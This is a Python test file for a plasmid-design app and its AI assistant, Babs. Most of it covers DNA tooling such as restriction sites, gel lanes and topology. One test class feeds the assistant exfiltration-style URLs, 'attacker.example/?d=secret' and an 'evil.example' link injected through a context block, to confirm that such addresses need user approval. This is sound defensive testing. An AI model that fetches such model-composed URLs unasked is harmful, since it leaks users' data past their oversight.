    from textual.widgets import _data_table as d
    fmt = d.default_cell_formatter
    for name in ("[alpha] clone 3", "[@click=app.quit]x[/]", "[/b] oops",
                 "[link=http://x]y[/link]", "pUC19 [3' end]"):
        assert fmt(name).plain == name, name
    styled = fmt("[green]ok[/]")
    assert styled.plain == "ok" and styled.spans      # app markup still works


# ── B1/B2: Babs asks before opening an address nobody gave her ─────────────

class TestBabsEgressProvenance:
    async def _screen(self, pilot, app, monkeypatch, *, approve=False,
                      search_payload=None):
        app.action_open_babs()
        await pilot.pause()
        await pilot.pause()
        scr = app.screen
        assert isinstance(scr, sc.BabsScreen)
        asked, ran = [], []

        def _ask(ep, body, *, physical=False, tainted=False, egress=False):
            asked.append((ep, egress))
            return approve
        monkeypatch.setattr(scr, "_ask_tool_approval", _ask)

        def _invoke(a, ep, body, source=None):
            ran.append(ep)
            if ep == "web-search":
                return (search_payload or {"ok": True, "hits": []}), 200
            return {"ok": True}, 200
        monkeypatch.setattr(sc, "_agent_invoke", _invoke)
        return scr, asked, ran

    @pytest.fixture
    def hermetic(self, monkeypatch):
        import splicecraft_babs as B
        monkeypatch.setattr(B, "list_installed", lambda **k: [])
        monkeypatch.setattr(B, "model_is_installed", lambda n, *a, **k: True)
        monkeypatch.setattr(B, "show", lambda *a, **k: {})
        monkeypatch.setattr(sc.BabsScreen, "_recall_for_turn",
                            lambda self, q: None)
        monkeypatch.setattr(sc, "_babs_memory_index", lambda: "")
        monkeypatch.setattr(sc.BabsScreen, "_refresh_num_ctx",
                            lambda self: None)
        monkeypatch.setattr(sc, "_learn_resolve_babs_home", lambda: None)

    @pytest.mark.parametrize("mode", ["readonly", "ask", "auto"])
    async def test_model_composed_url_asks_in_every_mode(
            self, monkeypatch, hermetic, mode):
        app = sc.PlasmidApp()
        async with app.run_test(size=(160, 48)) as pilot:
            await pilot.pause()
            scr, asked, ran = await self._screen(pilot, app, monkeypatch)
            scr._autonomy = mode
            out = scr._dispatch_agent_endpoint(
                "read-url", {"url": "https://attacker.example/?d=secret"})
            assert asked == [("read-url", True)]
            assert "declined" in out["error"] and ran == []

    async def test_url_the_user_typed_opens_without_asking(
            self, monkeypatch, hermetic):
        app = sc.PlasmidApp()
        async with app.run_test(size=(160, 48)) as pilot:
            await pilot.pause()
            scr, asked, ran = await self._screen(pilot, app, monkeypatch)
            scr._turn_user_urls = sc._babs_urls_in(
                "summarise https://repository.example/plasmid/50005/.")
            out = scr._dispatch_agent_endpoint(
                "read-url", {"url": "https://repository.example/plasmid/50005/"})
            assert asked == [] and ran == ["read-url"]
            assert out["status"] == 200

    async def test_url_from_a_search_result_opens_without_asking(
            self, monkeypatch, hermetic):
        app = sc.PlasmidApp()
        async with app.run_test(size=(160, 48)) as pilot:
            await pilot.pause()
            payload = {"ok": True, "hits": [
                {"title": "T", "url": "https://pubmed.example/123"}]}
            scr, asked, ran = await self._screen(pilot, app, monkeypatch,
                                                 search_payload=payload)
            scr._autonomy = "readonly"
            scr._dispatch_agent_endpoint("web-search", {"query": "gfp"})
            scr._dispatch_agent_endpoint(
                "read-url", {"url": "https://pubmed.example/123"})
            assert asked == [] and ran == ["web-search", "read-url"]

    def test_context_block_urls_are_not_user_urls(self):
        msg = (f"{sc._BABS_CTX_OPEN}description: see https://evil.example/x"
               f"{sc._BABS_CTX_CLOSE}\nwhat does this plasmid do?")
        assert sc._babs_urls_in(sc._babs_strip_context_block(msg)) == set()

    def test_recall_and_file_loads_taint_the_turn(self):
        for ep in ("recall-knowledge", "learn-results", "load-file"):
            assert ep in sc._BABS_TAINTING_ENDPOINTS


# ── X1: a linear end site keeps its SITE even when its cut falls outside ───

class TestLinearEndSites:
    def _bsai_near_end(self):
        # BsaI GGTCTC(N1)/(N5): a reverse-oriented site (GAGACC) 3 bp from the
        # left end of a linear part cuts ~5 bp to its left — past the end.
        return "AAA" + "GAGACC" + _rand_dna(300, 71)

    def test_site_is_listed_but_marked_as_not_cutting(self):
        seq = self._bsai_near_end()
        feats = sc._scan_restriction_sites(
            seq, circular=False, unique_only=False,
            allowed_enzymes=frozenset({"BsaI"}))
        resites = [f for f in feats if f["type"] == "resite" and f.get("label")]
        recuts = [f for f in feats if f["type"] == "recut"]
        assert [(r["start"], r.get("cut_outside")) for r in resites] == [(3, True)]
        assert recuts == []                    # it cleaves nothing HERE

    def test_digest_of_the_linear_part_is_unchanged(self):
        seq = self._bsai_near_end()
        assert sc._enzyme_cuts(seq, ["BsaI"], circular=False) == []

    def test_same_site_cuts_once_the_molecule_is_circular(self):
        seq = self._bsai_near_end()
        feats = sc._scan_restriction_sites(
            seq, circular=True, unique_only=False,
            allowed_enzymes=frozenset({"BsaI"}))
        assert [f for f in feats if f["type"] == "recut"]


# ── X2: gel digest lanes resolve names; an uncut circle stays a circle ─────

class TestGelDigestLanes:
    def _plasmid(self):
        # Exactly ONE BsaI site (the background can't hold GGTCTC/GAGACC).
        return "AT" * 750 + "GGTCTC" + "TA" * 750

    @pytest.mark.parametrize("spelling", ["BsaI", "bsai", "Eco31I"])
    def test_spellings_of_one_enzyme_give_one_answer(self, spelling):
        import splicecraft_gels as G
        seq = self._plasmid()
        bands = G._gel_bands_for_lane(
            {"source": "digest", "detail": spelling}, template_seq=seq,
            template_circular=True, pcr_amplicon=None)
        assert bands == [(len(seq), "linear")]      # one cut → linearised

    def test_unknown_enzyme_draws_nothing_and_the_endpoint_refuses(self):
        import splicecraft_gels as G
        import splicecraft_agent as AG
        seq = self._plasmid()
        assert G._gel_bands_for_lane(
            {"source": "digest", "detail": "EcoR1"}, template_seq=seq,
            template_circular=True, pcr_amplicon=None) == []
        out = AG._h_simulate_gel(None, {
            "lanes": [{"source": "digest", "detail": "EcoR1"}],
            "template_seq": seq})
        assert isinstance(out, tuple) and out[1] == 400 and "EcoR1" in out[0]["error"]

    def test_a_non_cutting_enzyme_leaves_a_supercoiled_circle(self):
        import splicecraft_gels as G
        seq = "A" * 3000
        bands = G._gel_bands_for_lane(
            {"source": "digest", "detail": "EcoRI"}, template_seq=seq,
            template_circular=True, pcr_amplicon=None)
        assert sorted(f for _bp, f in bands) == ["nicked", "supercoiled"]


# ── X3: Type IIB enzymes cut on both sides of their site ───────────────────

@pytest.mark.parametrize("enzyme,site", [("BaeI", "ACGTACGTATC"),
                                         ("BsaXI", "ACGTAGCCTCC")])
@pytest.mark.parametrize("reverse", [False, True])
def test_type_iib_digest_matches_biopython(enzyme, site, reverse):
    import random
    from Bio import Restriction
    from Bio.Seq import Seq
    rng = random.Random(f"{enzyme}-{reverse}")
    enz = getattr(Restriction, enzyme)
    for _ in range(25):
        n = rng.randint(200, 700)
        s = "".join(rng.choice("ACGT") for _ in range(n))
        pos = rng.randint(40, n - 60)
        planted = sc._rc(site) if reverse else site
        t = s[:pos] + planted + s[pos + len(planted):]
        ref = {(c - 1) % n for c in enz.search(Seq(t), linear=False)}
        got = {c["top"] for c in sc._enzyme_cuts(t, [enzyme], circular=True)}
        assert got == ref


# ── X11: a click on an upstream-cutting site highlights its footprint only ─

def test_upstream_cut_highlight_stays_local():
    n = 5000
    resite = {"start": 2000, "end": 2011, "strand": 1, "color": "red",
              "label": "BaeI", "top_cut_bp": 1990, "bottom_cut_bp": 1985,
              "ext_cut_bp": 1990}
    hi = sc._build_resite_highlight(n, resite)
    assert (hi["start"], hi["end"]) == (1985, 2011)
    # A Type IIS cut just past the origin still wraps the short way.
    wrap = {"start": 4995, "end": 5000, "strand": 1, "color": "red",
            "label": "BsaI", "top_cut_bp": 2, "bottom_cut_bp": 6,
            "ext_cut_bp": 2}
    hw = sc._build_resite_highlight(n, wrap)
    assert (hw["start"], hw["end"]) == (4995, 6)


# ── L1/L2: arrowless (0) and double (2) strands survive every rebuild ─────

class TestStrandMarkersSurvive:
    def test_rc_fragment_keeps_orientation_free_markers(self):
        import splicecraft_cloning as CL
        frag = {
            "top_seq": _rand_dna(120, 31),
            "left":  {"overhang_seq": "", "kind": "blunt", "enzyme": "X"},
            "right": {"overhang_seq": "", "kind": "blunt", "enzyme": "Y"},
            "features": [
                {"start": 10, "end": 40, "strand": 2, "label": "double"},
                {"start": 50, "end": 70, "strand": 0, "label": "arrowless"},
                {"start": 80, "end": 95, "strand": 1, "label": "fwd"},
                {"start": 100, "end": 115, "strand": -1, "label": "rev"},
            ],
            "source_label": "probe",
        }
        got = {f["label"]: f["strand"] for f in CL._rc_fragment(frag)["features"]}
        assert got == {"double": 2, "arrowless": 0, "fwd": -1, "rev": 1}

    def test_gibson_product_keeps_both_markers(self):
        import splicecraft_cloning as CL
        result = {"product_seq": _rand_dna(300, 34), "circular": True,
                  "features": [
                      {"start": 10, "end": 40, "strand": 2, "label": "double",
                       "type": "misc_feature"},
                      {"start": 50, "end": 70, "strand": 0,
                       "label": "overhang", "type": "misc_feature"}]}
        rec = CL._gibson_record_from_result({**result, "success": True},
                                            name="probe")
        by_label = {f.qualifiers["label"][0]: f for f in rec.features}
        assert by_label["double"].location.strand == 0
        assert by_label["double"].qualifiers["SpliceCraft_strand"] == ["double"]
        assert by_label["overhang"].location.strand == 0
        assert "SpliceCraft_strand" not in by_label["overhang"].qualifiers

    @pytest.mark.parametrize("strand,expect_biop", [(1, 1), (-1, -1),
                                                    (0, 0), (2, 0)])
    def test_biopython_strand_mapping(self, strand, expect_biop):
        from Bio.SeqFeature import FeatureLocation
        bp = sc._biopython_strand(strand)
        assert bp == expect_biop
        FeatureLocation(1, 5, strand=bp)    # never raises
        quals = sc._double_strand_qualifiers({}, strand)
        assert ("SpliceCraft_strand" in quals) is (strand == 2)

    def test_coerce_treats_zero_as_a_real_strand(self):
        assert sc._coerce_feature_strand(0) == 0
        assert sc._coerce_feature_strand(None) == 1
        assert sc._coerce_feature_strand("") == 1
        assert sc._coerce_feature_strand("garbage") == 1
        assert sc._coerce_feature_strand(7) == 1


# ── L5/X4: one topology rule — an unannotated record is circular ──────────

def test_no_module_decides_topology_by_string_equality():
    """`annotations.get("topology") == "circular"` makes an UNANNOTATED
    record linear, while `_record_is_circular` (and the map) make it
    circular: the map drew a site across the origin that the same record's
    endpoints answered `count: 0` for. One rule, one helper."""
    import re
    bad = []
    for fn in ("splicecraft.py", "splicecraft_agent.py", "splicecraft_fileio.py",
               "splicecraft_seqanalysis.py", "splicecraft_cloning.py"):
        for i, line in enumerate((_TESTS.parent / fn).read_text(
                encoding="utf-8").splitlines(), 1):
            if line.lstrip().startswith("#"):
                continue          # prose about the old shape is fine
            if re.search(r'get\(\s*"topology".*==\s*"circular"', line):
                bad.append(f"{fn}:{i}")
    assert not bad, ("use _record_is_circular (unannotated == circular): "
                     + ", ".join(bad))


def test_an_unannotated_record_is_circular_everywhere():
    seq = _rand_dna(600, 41)
    seq = seq[:300] + "GAATTC" + seq[306:]
    rec = _SR(_Seq(seq), id="t", name="t",
              annotations={"molecule_type": "DNA"})   # NO topology
    assert sc._record_is_circular(rec)
    import splicecraft_agent as AG

    class _App:
        _current_record = rec
    out = AG._h_list_restriction_sites(
        _App(), {"enzymes": ["EcoRI"], "min_len": 6})
    assert out["count"] == 1
    assert out["sites"][0]["start"] == 300


# ── L9: topology is a LOCUS FIELD, never a substring of the name ───────────

@pytest.mark.parametrize("name,circular", [
    ("pLinear2", True), ("pUC19-linearized", True), ("pUC19", True),
])
def test_a_plasmid_named_linear_is_still_circular(name, circular):
    gb = (f"LOCUS       {name}            2686 bp    DNA     circular SYN "
          f"01-JAN-2026\nORIGIN\n//\n")
    assert sc._gb_text_is_circular(gb) is circular
    assert sc._topology_from_gb_text(gb) == "circular"


def test_a_real_linear_locus_still_reads_linear():
    gb = ("LOCUS       amplicon             900 bp    DNA     linear   SYN "
          "01-JAN-2026\nORIGIN\n//\n")
    assert sc._gb_text_is_circular(gb) is False


# ── L4: the synthesis editor never silently rewrites what it loaded ────────

def _syn_entry(gb_text, eid="frag1", name="Frag 1"):
    return {"id": eid, "name": name, "gb_text": gb_text,
            "size": 0, "added": "", "kind": "fragment"}


class TestSynthesisEditorFidelity:
    def _gb(self, spliced: bool):
        seq = _rand_dna(240, 51)
        rec = _SR(_Seq(seq), id="frag1", name="frag1",
                  description="An imported fragment",
                  annotations={"molecule_type": "DNA", "topology": "linear",
                               "organism": "Synthetic construct",
                               "comment": "ordered from a vendor 2026-01"})
        rec.features.append(_SF(_FL(0, len(seq), 1), type="source",
                                qualifiers={"organism": ["Synthetic construct"]}))
        if spliced:
            rec.features.append(_SF(_CL([_FL(0, 60, 1), _FL(150, 240, 1)]),
                                    type="CDS",
                                    qualifiers={"label": ["spliced gene"]}))
        else:
            rec.features.append(_SF(_FL(10, 70, 1), type="CDS",
                                    qualifiers={"label": ["plain gene"]}))
        return sc._record_to_gb_text(rec)

    async def _screen(self, pilot, app, entry, monkeypatch):
        monkeypatch.setattr(sc, "_find_library_entry_by_id",
                            lambda i: entry if i == entry["id"] else None)
        app.action_open_synthesis()
        await pilot.pause()
        await pilot.pause()
        return app.screen

    async def test_a_spliced_feature_is_refused_not_flattened(self, monkeypatch):
        entry = _syn_entry(self._gb(spliced=True))
        app = sc.PlasmidApp()
        async with app.run_test(size=(160, 48)) as pilot:
            await pilot.pause()
            scr = await self._screen(pilot, app, entry, monkeypatch)
            notes = []
            monkeypatch.setattr(type(app), "notify",
                                lambda self, m, **k: notes.append(str(m)))
            scr._load_entry_by_id("frag1")
            await pilot.pause()
            assert notes and "spliced gene" in notes[0]
            assert scr._loaded_id is None or scr._loaded_id != "frag1"

    async def test_a_plain_fragment_keeps_its_provenance_on_resave(
            self, monkeypatch):
        entry = _syn_entry(self._gb(spliced=False))
        app = sc.PlasmidApp()
        async with app.run_test(size=(160, 48)) as pilot:
            await pilot.pause()
            scr = await self._screen(pilot, app, entry, monkeypatch)
            scr._load_entry_by_id("frag1")
            await pilot.pause()
            assert scr._loaded_id == "frag1"
            saved = {}
            monkeypatch.setattr(sc.LibraryPanel, "add_entry",
                                lambda self, rec, **k: saved.setdefault("rec", rec)
                                is None or True)
            ed = scr.query_one("#syn-editor", sc.SynthesisEditor)
            scr._commit_save(ed._seq, ed._feats, None)
            await pilot.pause()
            rec = saved["rec"]
            assert rec.annotations.get("organism") == "Synthetic construct"
            assert "vendor" in str(rec.annotations.get("comment"))
            assert rec.description == "An imported fragment"
            assert [f.type for f in rec.features].count("source") == 1


# ── P9: a dU primer is checked, not refused ───────────────────────────────

def test_deoxyuridine_is_read_as_thymine_and_said_so():
    import splicecraft_agent as AG
    # A dU primer is written with U where the template has T, so build one:
    # the oligo matches the template exactly once U is read as T.
    template = _rand_dna(380, 61)
    template = template[:100] + "ACGTTGCAGGCTATTCCAGGAT" + template[122:]
    primer = template[100:122]
    assert primer.endswith("T")
    out = AG._h_check_primer(None, {"primer": primer.replace("T", "U"),
                                    "template": template, "circular": False})
    assert out["ok"] and out["read_u_as_t"] is True
    assert out["best_identity"] == 100.0
    assert out["sites"][0]["foot_start"] == 100
    # A plain oligo says nothing about U.
    plain = AG._h_check_primer(None, {"primer": primer, "template": template,
                                      "circular": False})
    assert "read_u_as_t" not in plain


# ── AA7: a GFF3 describing several molecules can't be applied to one ───────

def test_apply_gff3_refuses_a_multi_sequence_file(tmp_path):
    rec = _SR(_Seq(_rand_dna(500, 71)), id="p", name="p",
              annotations={"molecule_type": "DNA", "topology": "circular"})
    gff = tmp_path / "two.gff3"
    gff.write_text(
        "##gff-version 3\n"
        "contigA\tx\tCDS\t10\t60\t.\t+\t0\tID=a\n"
        "contigB\tx\tCDS\t70\t120\t.\t+\t0\tID=b\n", encoding="utf-8")
    with pytest.raises(ValueError, match="different sequences"):
        _fileio._gff3_apply_to_loaded_record(rec, gff)
    assert not rec.features        # nothing applied

    one = tmp_path / "one.gff3"
    one.write_text("##gff-version 3\n"
                   "contigA\tx\tCDS\t10\t60\t.\t+\t0\tID=a\n", encoding="utf-8")
    assert _fileio._gff3_apply_to_loaded_record(rec, one) == 1


# ── H5: an agent sequence replace invalidates in-flight scans ─────────────

async def test_replace_sequence_bumps_the_record_load_counter(monkeypatch):
    """A sequence edit from the agent must invalidate in-flight workers the
    same way the GUI edit path does — otherwise a restriction scan dispatched
    for the OLD bases passes its guard and repaints stale sites."""
    import threading
    app = sc.PlasmidApp()
    async with app.run_test(size=(160, 48)) as pilot:
        await pilot.pause()
        rec = _SR(_Seq(_rand_dna(400, 72)), id="p", name="p",
                  annotations={"molecule_type": "DNA", "topology": "circular"})
        app._apply_record(rec)
        await pilot.pause()
        before = app._record_load_counter
        out: list = []

        def _run():
            out.append(sc._h_replace_sequence(
                app, {"start": 10, "end": 20, "bases": "ACGTACGTAC"}))
        t = threading.Thread(target=_run)
        t.start()
        for _ in range(200):
            await pilot.pause()
            if not t.is_alive():
                break
        t.join(timeout=5)
        assert out and not isinstance(out[0], tuple), out
        assert app._record_load_counter > before


# ── N4/N6: map-transcription never wraps a LINEAR molecule ────────────────

class TestLinearTranscriptionMap:
    def _feats(self, total):
        # A promoter at the far LEFT pointing left (minus strand) and a gene
        # that ENDS at the last base. On a circle the promoter reaches it the
        # long way round; on a linear molecule nothing does.
        return [
            {"type": "promoter", "start": 5, "end": 45, "strand": -1,
             "label": "Plac"},
            {"type": "CDS", "start": total - 300, "end": total, "strand": -1,
             "label": "gene"},
        ]

    def _gene(self, out):
        return next(g for g in out["genes"]
                    if g["cds"]["label"] == "gene")

    def test_a_gene_ending_at_the_last_base_is_not_reached_from_the_left(self):
        seq = _rand_dna(1200, 73)
        out = sc._map_transcription(seq, self._feats(len(seq)), circular=False)
        gene = self._gene(out)
        # Its 5' end (minus strand) is the LAST base; `% total` used to move
        # it to bp 0, where the leftmost promoter appears to sit right on it.
        assert gene["cds"]["end"] == len(seq)
        assert [r for r in gene["reachable_from"]
                if r["promoter"].get("label") == "Plac"] == []

    def test_the_same_layout_on_a_circle_does_reach_it(self):
        seq = _rand_dna(1200, 73)
        out = sc._map_transcription(seq, self._feats(len(seq)), circular=True)
        gene = self._gene(out)
        assert [r for r in gene["reachable_from"]
                if r["promoter"].get("label") == "Plac"], "a circle wraps"

    def test_host_recognition_does_not_splice_the_far_end_onto_a_promoter(self):
        # A promoter feature at bp 0 of a LINEAR molecule: its context window
        # must be clipped at the ends, never wrapped.
        seq = _rand_dna(900, 74)
        feats = [{"type": "promoter", "start": 0, "end": 40, "strand": 1,
                  "label": "P1"},
                 {"type": "CDS", "start": 100, "end": 400, "strand": 1,
                  "label": "g"}]
        lin = sc._map_transcription(seq, feats, circular=False)
        # Rotating the molecule's far end away cannot change a clipped window.
        moved = seq[:500] + _rand_dna(400, 75)
        lin2 = sc._map_transcription(moved, feats, circular=False)
        p1 = next(p for p in lin["promoters"] if p.get("label") == "P1")
        p2 = next(p for p in lin2["promoters"] if p.get("label") == "P1")
        assert p1["host_recognised"] == p2["host_recognised"]


# ── AA4: the optimizer never substitutes a host the caller didn't ask for ──

class TestOptimizeProteinTable:
    _P = {"protein": "MKV"}

    def test_an_unresolvable_table_is_refused_not_swapped_for_e_coli(self):
        import splicecraft_agent as AG
        for table in ("Bacillus subtilis", "E. coli K12 (custom)", "nope",
                      "1148"):
            out = AG._h_optimize_protein(None, {**self._P, "table": table})
            assert isinstance(out, tuple) and out[1] == 404, (table, out)
            assert "no codon table" in out[0]["error"]

    def test_an_integer_taxid_resolves_like_its_string(self):
        import splicecraft_agent as AG
        a = AG._h_optimize_protein(None, {**self._P, "table": 83333})
        b = AG._h_optimize_protein(None, {**self._P, "table": "83333"})
        assert not isinstance(a, tuple) and not isinstance(b, tuple)
        assert a["dna"] == b["dna"]

    def test_omitting_table_still_defaults_to_e_coli(self):
        import splicecraft_agent as AG
        out = AG._h_optimize_protein(None, dict(self._P))
        assert not isinstance(out, tuple), out
        assert out["dna"]

    def test_a_table_name_resolves(self):
        import splicecraft_agent as AG
        listed = AG._h_list_codon_tables(None, {})
        name = listed["tables"][0]["name"]
        out = AG._h_optimize_protein(None, {**self._P, "table": name})
        assert not isinstance(out, tuple), out


# ── X6: an enzyme collection's names are RESOLVED, never silently widened ──

class TestActiveEnzymeCollection:
    def _activate(self, names):
        sc._save_enzyme_collections([{"name": "Mine", "enzymes": names}])
        sc._set_active_enzyme_collection_name("Mine")

    def test_synonyms_and_casing_resolve(self, _protect_user_data=None):
        self._activate(["bsai", "Eco31I", "ecori"])
        allowed, unresolved = sc._active_enzyme_resolution()
        assert unresolved == []
        assert allowed == frozenset({"BsaI", "EcoRI"})

    def test_an_all_unknown_collection_does_not_become_the_full_catalog(self):
        self._activate(["NotAnEnzyme", "AlsoFake"])
        allowed, unresolved = sc._active_enzyme_resolution()
        assert allowed == frozenset()          # scan NOTHING, not everything
        assert sorted(unresolved) == ["AlsoFake", "NotAnEnzyme"]
        assert sc._active_enzyme_allowed_set() == frozenset()

    def test_no_active_collection_still_means_full_catalog(self):
        sc._set_active_enzyme_collection_name("")
        assert sc._active_enzyme_allowed_set() is None

    def test_the_endpoint_says_which_names_it_could_not_use(self):
        import splicecraft_agent as AG
        self._activate(["BsaI", "NotAnEnzyme"])
        seq = "AT" * 400 + "GGTCTC" + "TA" * 400
        rec = _SR(_Seq(seq), id="p", name="p",
                  annotations={"molecule_type": "DNA", "topology": "circular"})

        class _App:
            _current_record = rec
        out = AG._h_list_restriction_sites(_App(), {"min_len": 6})
        assert out["count"] == 1
        assert any("NotAnEnzyme" in w for w in out.get("warnings", []))


# ── H6: Ctrl+S keeps everything about the entry it doesn't own ────────────

async def test_ctrl_s_preserves_map_mode_alignments_and_added_date(monkeypatch):
    rec = _SR(_Seq(_rand_dna(600, 81)), id="keeper", name="keeper",
              annotations={"molecule_type": "DNA", "topology": "circular"})
    rec._tui_display_name = "Keeper 1"
    prior = {"name": "Keeper 1", "id": "keeper", "size": 600, "n_feats": 0,
             "source": "file:/somewhere/keeper.gb", "added": "2024-03-04",
             "gb_text": sc._record_to_gb_text(rec), "status": "VERIFIED",
             "kind": "plasmid", "map_mode": "linear",
             "alignments": [{"read": "r1", "identity": 99.5}],
             "notes": "kept by hand"}
    saved: list = []
    monkeypatch.setattr(sc, "_load_library", lambda: [dict(prior)])
    monkeypatch.setattr(sc, "_save_library", lambda e, **k: saved.append(e))
    app = sc.PlasmidApp()
    async with app.run_test(size=(160, 48)) as pilot:
        await pilot.pause()
        app._apply_record(rec)
        app._source_path = None
        await pilot.pause()
        import threading
        # Call the worker BODY directly (not the @work wrapper): the test
        # drives it on its own thread so `call_from_thread` works.
        _body = getattr(type(app)._save_worker, "__wrapped__", None)
        assert _body is not None, "save worker is no longer @work-decorated"
        t = threading.Thread(target=lambda: _body(app))
        t.start()
        for _ in range(200):
            await pilot.pause()
            if not t.is_alive():
                break
        t.join(timeout=5)
    assert saved, "nothing written"
    entry = saved[-1][0]
    assert entry["map_mode"] == "linear"
    assert entry["alignments"] == [{"read": "r1", "identity": 99.5}]
    assert entry["added"] == "2024-03-04"
    assert entry["kind"] == "plasmid"
    assert entry["notes"] == "kept by hand"
    assert entry["source"] == "file:/somewhere/keeper.gb"
    assert entry["status"] == "VERIFIED"
